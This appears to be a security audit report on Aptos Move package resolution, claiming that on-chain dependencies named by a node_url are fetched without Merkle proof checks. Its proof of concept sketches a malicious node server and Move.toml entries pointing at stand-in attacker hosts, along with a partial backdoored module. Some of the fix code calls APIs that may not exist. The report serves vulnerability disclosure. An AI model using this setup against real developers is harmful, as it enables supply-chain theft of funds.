# Audit Report

## Title
Compromised Full Node Can Serve Unverified Malicious Package Bytecode via node_url

## Summary
The Move package resolution system trusts arbitrary full nodes specified in `PackageLocation::Aptos` dependencies without cryptographic verification. When a package declares an on-chain dependency with a `node_url` parameter, the system fetches bytecode modules directly from that node via REST API calls without validating Merkle proofs or state commitments. A compromised or malicious full node can serve arbitrary bytecode that will be compiled into dependent packages, enabling supply chain attacks. [1](#0-0) 

## Finding Description
The vulnerability exists in the on-chain package fetching mechanism used during Move package compilation. When a Move.toml manifest declares a dependency with `PackageLocation::Aptos`, it specifies both a `node_url` (which full node to query) and a `package_addr` (the on-chain address of the package).

The resolution flow is:

1. **Package Resolution** - When resolving dependencies, the system creates a URL from the user-provided `node_url` string: [2](#0-1) 

2. **Network Version Query** - The system queries the specified node for its current ledger version without any cryptographic validation: [3](#0-2) 

3. **Package Fetching** - The system creates an Aptos REST client pointing to the potentially malicious node and fetches the PackageRegistry resource and all module bytecode: [4](#0-3) 

4. **No Proof Verification** - The REST client simply makes HTTP requests and parses BCS-encoded responses without any Merkle proof validation: [5](#0-4) 

**Critical Security Gap**: While Aptos implements comprehensive cryptographic proof systems (SparseMerkleProof, AccumulatorProof, TrustedState verification), the package cache system does NOT use any of these mechanisms. The fetched bytecode is never verified against the blockchain's Merkle tree root or any state commitment.

**Attack Scenario**:
1. Attacker publishes legitimate package "TokenUtils" on-chain at address `0xLEGIT`
2. Attacker creates a malicious package dependency specification:
   ```toml
   [dependencies]
   TokenUtils = { aptos = "https://evil-node.attacker.com", address = "0xLEGIT" }
   ```
3. Developer includes this package as a transitive dependency
4. During compilation, the package resolver contacts `evil-node.attacker.com`
5. The malicious node returns backdoored bytecode with hidden fund-draining logic
6. Developer compiles and deploys the compromised code, believing it matches the on-chain version
7. Attacker exploits the backdoor to steal funds from contracts using the compromised package

## Impact Explanation
**Critical Severity** - This vulnerability enables a sophisticated supply chain attack with severe consequences:

- **Loss of Funds**: Malicious bytecode can include hidden fund-draining logic, token minting vulnerabilities, or unauthorized access patterns. Once deployed, attackers can exploit these backdoors to steal assets from contracts and users.

- **Consensus Violations**: If malicious bytecode causes non-deterministic behavior or introduces state inconsistencies, it can lead to validator disagreement and potential chain splits.

- **Widespread Compromise**: A single compromised dependency can affect all packages that transitively depend on it. Popular utility libraries (e.g., math libraries, token standards) could compromise the entire ecosystem.

- **Trust Model Violation**: Developers reasonably expect that on-chain dependencies are fetched from the blockchain with cryptographic guarantees. This vulnerability completely bypasses the blockchain's security model.

The attack requires:
- No validator access or insider privileges
- Only the ability to run a full node and publish a package specification
- Minimal technical sophistication (standard HTTP server returning crafted responses)

This meets the Critical Severity threshold per Aptos bug bounty criteria for "Loss of Funds (theft or minting)" and "Consensus/Safety violations."

## Likelihood Explanation
**High Likelihood** - This vulnerability is highly likely to be exploited for several reasons:

1. **Ease of Exploitation**: Attacker only needs to:
   - Run a malicious full node (trivial infrastructure requirement)
   - Publish a Move package with a dependency pointing to their node
   - Wait for developers to use the package

2. **Developer Trust**: Developers naturally trust on-chain dependencies and may not scrutinize the `node_url` parameter, especially in transitive dependencies buried deep in the dependency tree.

3. **No Detection Mechanism**: There is no warning system or audit trail to detect when packages are fetched from non-standard nodes. The malicious bytecode passes all compiler and bytecode verifier checks.

4. **Supply Chain Amplification**: A single compromised popular package can affect thousands of dependent packages, similar to real-world npm/PyPI supply chain attacks.

5. **Profit Motive**: DeFi protocols on Aptos manage significant value, making this an attractive target for sophisticated attackers.

## Recommendation
Implement cryptographic state proof verification for all on-chain package fetches. The system must verify that fetched bytecode matches the actual on-chain state via Merkle proofs.

**Required Changes**:

1. **Modify REST API calls** to request state proofs alongside package data:
   - Use `/accounts/{address}/resource/{type}` with proof parameter
   - Verify SparseMerkleProof against a trusted state root

2. **Add TrustedState verification** in package_cache.rs:
   ```rust
   pub async fn fetch_on_chain_package(
       &self,
       fullnode_url: &Url,
       network_version: u64,
       address: AccountAddress,
       package_name: &str,
   ) -> Result<PathBuf> {
       // ... existing code ...
       
       // NEW: Fetch with proof
       let package_registry_with_proof = client
           .get_account_resource_with_proof_at_version::<PackageRegistry>(
               address,
               "0x1::code::PackageRegistry",
               network_version,
           )
           .await?;
       
       // NEW: Verify proof against trusted state
       let trusted_state = TrustedState::fetch_and_verify(fullnode_url).await?;
       package_registry_with_proof.verify(&trusted_state)?;
       
       // Continue with verified data...
   }
   ```

3. **Implement module bytecode verification**: Each module should be verified against its hash stored in the on-chain PackageMetadata.

4. **Add security warnings**: Warn developers when dependencies use non-standard node URLs or suggest using only official/trusted nodes.

5. **Lock file validation**: Include cryptographic hashes of fetched bytecode in Move.lock to detect tampering. [6](#0-5) [7](#0-6) 

## Proof of Concept

**Step 1: Setup Malicious Node**
```rust
// malicious_node.rs
// Simple HTTP server that returns crafted PackageRegistry responses
use actix_web::{web, App, HttpServer, HttpResponse};
use aptos_framework::natives::code::{PackageRegistry, PackageMetadata, ModuleMetadata};

async fn serve_malicious_package() -> HttpResponse {
    // Return malicious bytecode instead of legitimate on-chain code
    let malicious_package = PackageRegistry {
        packages: vec![PackageMetadata {
            name: "TokenUtils".to_string(),
            modules: vec![ModuleMetadata {
                name: "math".to_string(),
                // Backdoored bytecode with hidden transfer logic
            }],
            // ... other fields ...
        }],
    };
    HttpResponse::Ok().body(bcs::to_bytes(&malicious_package).unwrap())
}

#[actix_web::main]
async fn main() {
    HttpServer::new(|| {
        App::new()
            .route("/v1/accounts/{address}/resource/{type}", 
                   web::get().to(serve_malicious_package))
    })
    .bind("0.0.0.0:8080")
    .unwrap()
    .run()
    .await
    .unwrap();
}
```

**Step 2: Malicious Dependency Declaration**
```toml
# Move.toml of attacker-controlled package
[package]
name = "InnocuousWrapper"
version = "1.0.0"

[dependencies]
TokenUtils = { aptos = "http://attacker-node.com:8080", address = "0x123" }
```

**Step 3: Victim Builds Package**
```bash
# Victim developer builds their package that depends on InnocuousWrapper
$ aptos move compile --package-dir my-project/

# Package resolver fetches TokenUtils from attacker-node.com
# Malicious bytecode is cached and compiled without verification
# Victim deploys compromised code to mainnet
```

**Step 4: Exploitation**
```move
// Deployed victim code unknowingly contains backdoor from compromised TokenUtils
module victim::defi_protocol {
    use attacker::TokenUtils::math;  // Compromised module
    
    public entry fun deposit(user: &signer, amount: u64) {
        // math::safe_add() contains hidden backdoor that transfers to attacker
        let total = math::safe_add(get_balance(), amount);
        // ... rest of logic ...
    }
}
```

The malicious `math::safe_add()` function performs the addition correctly but also includes hidden bytecode instructions that transfer a portion of funds to the attacker's address, exploiting the developer's trust in the on-chain dependency.

## Notes
This vulnerability represents a fundamental breakdown in the security model for on-chain dependencies. While the Move bytecode verifier will detect certain classes of malicious code, it cannot distinguish between legitimate complex logic and cleverly disguised backdoors that follow all type safety rules.

The fix requires integrating Aptos's existing cryptographic proof infrastructure (which is already implemented for state sync and light clients) into the package resolution system. This is architecturally sound and aligns with Aptos's zero-trust security principles.

### Citations

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L142-156)
```rust
    /// Refers to a package published on-chain.
    ///
    // TODO: The current design is tentative. There are issues we plan to resolve later:
    //       - Leaky abstraction -- can we still want to maintain clear Move/Aptos separation?
    //       - Replacing `String` w/ more specific data structures
    //         - `node_url`: Should accept both URL and known network names (e.g. "mainnet")
    //         - `package_addr`: May accept both numerical and named addresses
    Aptos {
        /// URL to the Aptos full-node connected to the network where the package is published.
        node_url: String,

        /// Address of the published package.
        package_addr: AccountAddress,
    },
}
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L413-428)
```rust
        PackageLocation::Aptos {
            node_url,
            package_addr,
        } => {
            remote_url = Url::from_str(&node_url)?;

            let identity = PackageIdentity {
                name: dep_name.to_string(),
                location: SourceLocation::OnChain {
                    node: CanonicalNodeIdentity::new(&remote_url)?,
                    package_addr,
                },
            };

            (identity, Some(&remote_url))
        },
```

**File:** third_party/move/tools/move-package-resolver/src/lock.rs (L90-106)
```rust
    pub async fn resolve_network_version(&mut self, fullnode_url: &Url) -> Result<u64> {
        let node_identity = CanonicalNodeIdentity::new(fullnode_url)?;

        let res = match self.on_chain.entry(node_identity.to_string()) {
            btree_map::Entry::Occupied(entry) => *entry.get(),
            btree_map::Entry::Vacant(entry) => {
                let client = aptos_rest_client::Client::new(fullnode_url.clone());
                let version = client.get_ledger_information().await?.into_inner().version;

                entry.insert(version);

                version
            },
        };

        Ok(res)
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L280-340)
```rust
    pub async fn fetch_on_chain_package(
        &self,
        fullnode_url: &Url,
        network_version: u64,
        address: AccountAddress,
        package_name: &str,
    ) -> Result<PathBuf>
    where
        L: PackageCacheListener,
    {
        let on_chain_packages_path = self.root.join("on-chain");

        let canonical_node_identity = CanonicalNodeIdentity::new(fullnode_url)?;
        let canonical_name = format!(
            "{}+{}+{}+{}",
            &*canonical_node_identity, network_version, address, package_name
        );

        let cached_package_path = on_chain_packages_path.join(&canonical_name);

        // If the package directory already exists, assume it has been cached.
        if cached_package_path.exists() {
            // TODO: In the future, consider verifying data integrity,
            //       e.g. hash of metadata or full contents.
            return Ok(cached_package_path);
        }

        // Package directory does not exist -- need to download the package and cache it.
        //
        // First, acquire a lock to ensure exclusive write access to this package.
        let lock_path = cached_package_path.with_extension("lock");

        fs::create_dir_all(&on_chain_packages_path)?;
        let _file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        self.listener.on_file_lock_acquired(&lock_path);

        // After acquiring the lock, re-check if the package was already cached by another process.
        if cached_package_path.exists() {
            return Ok(cached_package_path);
        }

        // Fetch the on-chain package registry at the specified ledger version and look-up the
        // package by name.
        self.listener
            .on_bytecode_package_download_start(address, package_name);

        let client = aptos_rest_client::Client::new(fullnode_url.clone());

        let package_registry = client
            .get_account_resource_at_version_bcs::<PackageRegistry>(
                address,
                "0x1::code::PackageRegistry",
                network_version,
            )
            .await?
            .into_inner();
```

**File:** crates/aptos-rest-client/src/lib.rs (L1223-1238)
```rust
    pub async fn get_account_resource_at_version_bcs<T: DeserializeOwned>(
        &self,
        address: AccountAddress,
        resource_type: &str,
        version: u64,
    ) -> AptosResult<Response<T>> {
        let url = self.build_path(&format!(
            "accounts/{}/resource/{}?ledger_version={}",
            address.to_hex(),
            resource_type,
            version
        ))?;

        let response = self.get_bcs(url).await?;
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
    }
```

**File:** types/src/trusted_state.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

#![allow(clippy::arc_with_non_send_sync)]

use crate::{
    epoch_change::{EpochChangeProof, Verifier},
    epoch_state::EpochState,
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    proof::TransactionAccumulatorSummary,
    state_proof::StateProof,
    transaction::Version,
    waypoint::Waypoint,
};
use anyhow::{bail, ensure, format_err, Result};
use aptos_crypto_derive::{BCSCryptoHash, CryptoHasher};
#[cfg(any(test, feature = "fuzzing"))]
use proptest_derive::Arbitrary;
use serde::{Deserialize, Serialize};

/// `TrustedState` keeps track of light clients' latest, trusted view of the
/// ledger state. Light clients can use proofs from a state proof to "ratchet"
/// their view forward to a newer state.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize, CryptoHasher, BCSCryptoHash)]
#[cfg_attr(any(test, feature = "fuzzing"), derive(Arbitrary))]
pub enum TrustedState {
    /// The current trusted state is an epoch waypoint, which is a commitment to
    /// an epoch change ledger info. Most light clients will start here when
    /// syncing for the first time.
    EpochWaypoint(Waypoint),
    /// The current trusted state is inside a verified epoch (which includes the
    /// validator set inside that epoch).
    EpochState {
        /// The current trusted version and a commitment to a ledger info inside
        /// the current trusted epoch.
        waypoint: Waypoint,
        /// The current epoch and validator set inside that epoch.
        epoch_state: EpochState,
    },
}

/// `TrustedStateChange` is the result of attempting to ratchet to a new trusted
/// state. In order to reduce redundant error checking, `TrustedStateChange` also
/// contains references to relevant items used to ratchet us.
#[derive(Clone, Debug)]
pub enum TrustedStateChange<'a> {
    /// We have a newer `TrustedState` but it's still in the same epoch, so only
    /// the latest trusted version changed.
    Version { new_state: TrustedState },
    /// We have a newer `TrustedState` and there was at least one epoch change,
```

**File:** types/src/proof/definition.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

//! This module has definition of various proofs.

use super::{
    accumulator::InMemoryAccumulator, position::Position, verify_transaction_info,
    MerkleTreeInternalNode, SparseMerkleInternalNode, SparseMerkleLeafNode,
};
use crate::{
    ledger_info::LedgerInfo,
    proof::accumulator::InMemoryTransactionAccumulator,
    transaction::{TransactionInfo, Version},
};
use anyhow::{bail, ensure, format_err, Context, Result};
#[cfg(any(test, feature = "fuzzing"))]
use aptos_crypto::hash::TestOnlyHasher;
use aptos_crypto::{
    hash::{
        CryptoHash, CryptoHasher, EventAccumulatorHasher, TransactionAccumulatorHasher,
        SPARSE_MERKLE_PLACEHOLDER_HASH,
    },
    HashValue,
};
#[cfg(any(test, feature = "fuzzing"))]
use proptest_derive::Arbitrary;
use serde::{Deserialize, Serialize};
use std::{any::type_name, marker::PhantomData};

/// A proof that can be used authenticate an element in an accumulator given trusted root hash. For
/// example, both `LedgerInfoToTransactionInfoProof` and `TransactionInfoToEventProof` can be
/// constructed on top of this structure.
#[derive(Clone, Serialize, Deserialize)]
pub struct AccumulatorProof<H> {
    /// All siblings in this proof, including the default ones. Siblings are ordered from the bottom
    /// level to the root level.
    siblings: Vec<HashValue>,

    phantom: PhantomData<H>,
}

/// Because leaves can only take half the space in the tree, any numbering of the tree leaves must
/// not take the full width of the total space.  Thus, for a 64-bit ordering, our maximumm proof
/// depth is limited to 63.
pub type LeafCount = u64;
pub const MAX_ACCUMULATOR_PROOF_DEPTH: usize = 63;
pub const MAX_ACCUMULATOR_LEAVES: LeafCount = 1 << MAX_ACCUMULATOR_PROOF_DEPTH;

impl<H> AccumulatorProof<H>
where
```
